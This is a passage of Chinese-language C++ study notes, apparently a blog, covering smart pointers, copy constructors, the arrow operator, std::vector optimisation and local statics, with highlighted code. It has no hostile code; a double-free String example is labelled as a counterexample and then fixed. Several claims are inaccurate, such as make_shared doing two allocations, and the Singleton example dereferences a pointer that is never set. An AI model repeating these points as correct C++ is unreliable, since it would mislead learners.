class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Created Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Destroyed Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ScopedPtr</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  Entity* m_Ptr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">ScopedPtr</span>(Entity* ptr)</span><br><span class="line">    : <span class="built_in">m_Ptr</span>(ptr) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">ScopedPtr</span>() &#123;</span><br><span class="line">    <span class="keyword">delete</span> m_Ptr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    ScopedPtr e = <span class="keyword">new</span> <span class="built_in">Entity</span>();  <span class="comment">// 隐式转换</span></span><br><span class="line">    <span class="comment">//ScopedPtr e(new Entity());</span></span><br><span class="line">  &#125;  <span class="comment">// 超出作用域, e析构</span></span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Main not end until here\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- Out ---</span></span><br><span class="line">Created Entity!</span><br><span class="line">Destroyed Entity!</span><br><span class="line">Main <span class="keyword">not</span> end until here</span><br></pre></td></tr></table></figure><h1 id="43-SMART-POINTERS-in-C-std-unique-ptr-std-shared-ptr-std-weak-ptr">43 SMART POINTERS in C++ (std::unique_ptr, std::shared_ptr, std::weak_ptr)</h1><p>智能指针本质上是<strong>一个原始指针的包装，new后不需要手动delete，甚至可能new都不需要。</strong></p><h2 id="unique-ptr-开销小，优先选择">unique_ptr 开销小，优先选择</h2><p><strong>不能复制unique_ptr</strong>：复制的两个指针指向同一内存块，如果其中一个dead，内存就会被释放，这样指向同一内存的第二个unique_ptr指向已被释放的内存。<br>效率高、效率很高：<strong>栈</strong>上分配。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span>  <span class="comment">// 需要包含</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Created Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Destroyed Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//std::unique_ptr&lt;Entity&gt; entity(new Entity());  // 写法1</span></span><br><span class="line">    std::unique_ptr&lt;Entity&gt; entity = std::<span class="built_in">make_unique</span>&lt;Entity&gt;();  <span class="comment">// make_unique 异常安全</span></span><br><span class="line">    <span class="comment">//std::unique_ptr&lt;Entity&gt; entity = new Entity();  // 不能这样, unique_ptr构造函数是explicit的</span></span><br><span class="line">  &#125;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>std::make_unique&lt;类&gt;()是在C++14引入的，C++11并不支持。<br>不直接调用new的原因是为了 <strong>异常安全</strong>。</p><h2 id="shared-ptr">shared_ptr</h2><p>实现方式取决于 <strong>编译器</strong> 和 <strong>在编译器中使用的标准库</strong>，比如<strong>引用计数（reference counting）</strong>——引用计数归零时释放内存。<br>shared_ptr 需要分配另一块内存，叫做<strong>控制块</strong>，用于存储引用计数。</p><p>std::make_share&lt;类&gt;() 包括2次内存分配，先做一次new Entity的分配，然后是shared_ptr的控制内存块的分配。</p><p>当将一个shared_ptr赋值给另一个shared_ptr会增加引用计数，当把一个shared_ptr赋值给一个weak_ptr时不会增加引用计数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span>  <span class="comment">// 需要包含</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Created Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">Entity</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Destroyed Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    std::shared_ptr&lt;Entity&gt; e0;</span><br><span class="line">    &#123;</span><br><span class="line">      std::shared_ptr&lt;Entity&gt; sharedEntity = std::<span class="built_in">make_shared</span>&lt;Entity&gt;();</span><br><span class="line">      std::weak_ptr&lt;Entity&gt; w = sharedEntity;</span><br><span class="line">      e0 = sharedEntity;</span><br><span class="line">    &#125;  <span class="comment">// e0尚在作用域，引用为1</span></span><br><span class="line">  &#125;  <span class="comment">// 引用归零，执行析构函数</span></span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    std::weak_ptr&lt;Entity&gt; w;</span><br><span class="line">    &#123;</span><br><span class="line">      std::shared_ptr&lt;Entity&gt; shareEntity = std::<span class="built_in">make_shared</span>&lt;Entity&gt;();</span><br><span class="line">      w = shareEntity;</span><br><span class="line">    &#125;  <span class="comment">// 引用归0，执行析构函数</span></span><br><span class="line">  &#125;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="weak-ptr">weak_ptr</h2><p>可被复制，但是不会增加额外的控制块来控制计数，仅仅声明这个指针还活着。</p><h1 id="44-Copying-and-Copy-Constructors-in-C">44 Copying and Copy Constructors in C++</h1><p>除引用外，当使用赋值符号时，总是在做值赋值。<br>可能是指针（内存地址）值，也可以是直接内存数据的值。</p><p>浅复制：复制对象时看对象由什么组成，如果包括指针成员对象，则<strong>直接复制指针而不会看指针指向的内容，不会重新调用构造函数。</strong></p><p>反面例子，请找出问题：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">String</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">char</span>* m_buffer;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> m_size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>* string) &#123;</span><br><span class="line">    m_size = <span class="built_in">strlen</span>(string);</span><br><span class="line">    m_buffer = <span class="keyword">new</span> <span class="type">char</span>[m_size + <span class="number">1</span>];  <span class="comment">// 包含结束字符</span></span><br><span class="line">    <span class="built_in">strcpy_s</span>(m_buffer, m_size + <span class="number">1</span>, string); <span class="comment">// 自动会复制结束标志</span></span><br><span class="line">    <span class="comment">//memcpy(m_buffer,string, m_size);</span></span><br><span class="line">    <span class="comment">//m_buffer[m_size] = 0;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">String</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;释放m_buffer&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">delete</span>[] m_buffer;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>&amp; <span class="keyword">operator</span>[](<span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> index) &#123;</span><br><span class="line">    <span class="keyword">return</span> m_buffer[index];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 友元声明，让类外函数可以访问string</span></span><br><span class="line">  <span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; stream, <span class="type">const</span> String&amp; string);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; stream, <span class="type">const</span> String&amp; string) &#123;</span><br><span class="line">  stream &lt;&lt; string.m_buffer;</span><br><span class="line">  <span class="keyword">return</span> stream;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  String s1 = <span class="string">&quot;JKA&quot;</span>;</span><br><span class="line">  String s2 = s1;</span><br><span class="line">  s2[<span class="number">2</span>] = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  std::cout &lt;&lt; s1 &lt;&lt; std::endl;</span><br><span class="line">  std::cout &lt;&lt; s2 &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于s1和s2的<strong>m_buffer指向同一缓冲区</strong>，超出作用域时两变量先后执行析构函数，会造成double free的问题。</p><p><strong>C++默认拷贝函数，如果不重构就隐式调用如下函数：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>(<span class="type">const</span> String&amp; other)  <span class="comment">// 类型是 &quot;const 类 &amp;&quot;</span></span><br><span class="line">: <span class="built_in">m_Buffer</span>(other.m_Buffer), <span class="built_in">m_Size</span>(other.m_Size) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="built_in">String</span> (<span class="type">const</span> String&amp; other) &#123;</span><br><span class="line">  <span class="built_in">memcpy</span>(<span class="keyword">this</span>, &amp;other, <span class="built_in">sizeof</span>(String));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>深复制：这里的方法是 <strong>拷贝构造函数</strong>，当复制第二个字符串时会被调用。</p><p>使用深拷贝后的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">String</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">char</span>* m_buffer;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> m_size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>* string) &#123;</span><br><span class="line">    m_size = <span class="built_in">strlen</span>(string);</span><br><span class="line">    m_buffer = <span class="keyword">new</span> <span class="type">char</span>[m_size + <span class="number">1</span>];  <span class="comment">// 包含终止字符</span></span><br><span class="line">    <span class="built_in">strcpy_s</span>(m_buffer, m_size + <span class="number">1</span>, string); <span class="comment">// 自动复制中指标志</span></span><br><span class="line">    <span class="comment">//memcpy(m_buffer, /*string, m_size);</span></span><br><span class="line">    <span class="comment">//m_buffer[m_size] = 0;*/</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">String</span>(<span class="type">const</span> String&amp; other)  <span class="comment">// 拷贝构造函数，注意参数</span></span><br><span class="line">    : <span class="built_in">m_size</span>(other.m_size) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Copy&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    m_buffer = <span class="keyword">new</span> <span class="type">char</span>[m_size + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(m_buffer, other.m_buffer, m_size + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">String</span>() &#123;</span><br><span class="line">    <span class="keyword">delete</span>[] m_buffer;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>&amp; <span class="keyword">operator</span>[](<span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> index) &#123;</span><br><span class="line">    <span class="keyword">return</span> m_buffer[index];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 友元声明</span></span><br><span class="line">  <span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; stream, <span class="type">const</span> String&amp; string);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; stream, <span class="type">const</span> String&amp; string) &#123;</span><br><span class="line">  stream &lt;&lt; string.m_buffer;</span><br><span class="line">  <span class="keyword">return</span> stream;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintString</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; string &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  String s1 = <span class="string">&quot;JKA&quot;</span>;</span><br><span class="line">  String s2 = s1;</span><br><span class="line">  s2[<span class="number">2</span>] = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">PrintString</span>(s1);</span><br><span class="line">  <span class="built_in">PrintString</span>(s2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Out</span></span><br><span class="line">Copy</span><br><span class="line">Copy</span><br><span class="line">JKA</span><br><span class="line">Copy</span><br><span class="line">JKB</span><br></pre></td></tr></table></figure><p>问题的原因是没有PrintString中未使用引用，而是由进行了复制。</p><blockquote><p>💡 技巧：尽可能通过const引用去传递参数。</p></blockquote><h1 id="45-The-Arrow-Operator-in-C">45 The Arrow Operator in C++</h1><p>-&gt; 是 (*pointer).member; 的语法糖。</p><p>const指针只能调用const方法。</p><p>一种用箭头计算偏移量的方法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Vector3</span> &#123;</span><br><span class="line">  <span class="type">float</span> x, y, z;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> offset = (<span class="type">int</span>)&amp;((Vector3*)<span class="literal">nullptr</span>)-&gt;y;  <span class="comment">// 取y成员的地址</span></span><br><span class="line">  std::cout &lt;&lt; offset &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="46-Dynamic-Arrays-in-C-std-vector">46 Dynamic Arrays in C++ (std::vector)</h1><p>标准模板库（Standard Template Library, STL）本质上是一个库，里面装满了容器、容器类型，这些容器包含特定的数据。整个库模板化，这意味着容器的底层数据类型由程序员决定。</p><p>标准模版库的速度不是最优先考虑的，需要同时兼顾兼容性和性能，很多情况下工作室和团队最终会创建自己的容器库。</p><p>vector其实更应当被称为<strong>ArrayList</strong>。原理：<strong>当超出空间时，会在内存中创建一个比第一个大的新数组，然后把数据都复制到新数组，然后删除旧的。</strong><br>vector倾向于经常复制，所以并不能获得最佳性能。</p><p>存储vertex对象比存储指针在技术上更优（实际上很难说，要视情况而定），因为动态数组是<strong>内存连续的数组，它们都在同一条高速缓存线上</strong>。但存放指针的话，重新分配内存时，数据不用复制只用复制指针。</p><p>遍历时尽量使用 <code>for (Vertex&amp; v : vertices)</code> ，加不加const关系不大，但加&amp;可有效避免复制。</p><p>删除第2个元素：<code>vertices.erase(vertices.begin() +1)</code> ，需要传入迭代器，而非序号。</p><h1 id="47-Optimizing-the-usage-of-std-vector-in-C">47 Optimizing the usage of std::vector in C++</h1><p>策略：避免复制。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vertex</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">int</span> x, y, z;</span><br><span class="line">  <span class="built_in">Vertex</span>(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span><br><span class="line">    : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y), <span class="built_in">z</span>(z) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Vertex</span>(<span class="type">const</span> Vertex&amp; vertex)  <span class="comment">// 拷贝构造函数</span></span><br><span class="line">    : <span class="built_in">x</span>(vertex.x), <span class="built_in">y</span>(vertex.y), <span class="built_in">z</span>(vertex.z) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Copied!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::vector&lt;Vertex&gt; vertices;</span><br><span class="line">  vertices.<span class="built_in">push_back</span>(Vertex&#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;);</span><br><span class="line">  vertices.<span class="built_in">push_back</span>(&#123; <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> &#125;);  <span class="comment">// 隐式转换，同上</span></span><br><span class="line">  vertices.<span class="built_in">push_back</span>(&#123; <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span> &#125;);</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Out</span></span><br><span class="line">Copied!</span><br><span class="line">Copied!</span><br><span class="line">Copied!</span><br><span class="line">Copied!</span><br><span class="line">Copied!</span><br><span class="line">Copied!</span><br></pre></td></tr></table></figure><p>包含6次copy，3次在main栈帧中创建Vertex局部变量后作为参数copy给push_back参数。第2次push_back时需要扩容，复制第一个Vertex，第3次push_back时也需要扩容，复制第一个和第二个Vertex。</p><p>优化：</p><ul><li><strong>reserve 提前申请内存，避免动态申请开销</strong></li><li><strong>emplace_back 直接在容器尾部创建元素，省略拷贝或移动过程</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::vector&lt;Vertex&gt; vertices;</span><br><span class="line">  vertices.<span class="built_in">reserve</span>(<span class="number">3</span>);</span><br><span class="line">  vertices.<span class="built_in">emplace_back</span>(Vertex&#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;);  <span class="comment">// 1次copy, 不要这样写</span></span><br><span class="line">  vertices.<span class="built_in">emplace_back</span>(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);  <span class="comment">// 无&#123;&#125;喔</span></span><br><span class="line">  vertices.<span class="built_in">emplace_back</span>(<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>);</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Out</span></span><br><span class="line">Copied!</span><br></pre></td></tr></table></figure><h1 id="48-Local-Static-in-C">48 Local Static in C++</h1><p>local static：可以在局部作用域中使用static来声明一个变量。考虑变量的生存期和作用域。</p><p>生存期——在被删除前，在内存中会存在多久。<br>作用域——我们可以访问变量的范围。</p><p>函数内的局部静态和类成员的局部静态没有多少不同，<strong>除了类静态成员变量可以被类的不同对象访问。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> i = <span class="number">0</span>;   <span class="comment">// static 延长了变量的生存期</span></span><br><span class="line">  std::cout &lt;&lt; i++ &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Func</span>();</span><br><span class="line">  <span class="built_in">Func</span>();</span><br><span class="line">  <span class="built_in">Func</span>();</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Out</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>可能需要在程序的某处调用一个静态初始化函数来创建所有对象。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">static</span> Singleton&amp; <span class="title">Get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> Singleton* s_Instance;  <span class="comment">// static 延长生存期至永远</span></span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> i = <span class="number">10</span>;</span><br><span class="line">    ++i;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> *s_Instance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span 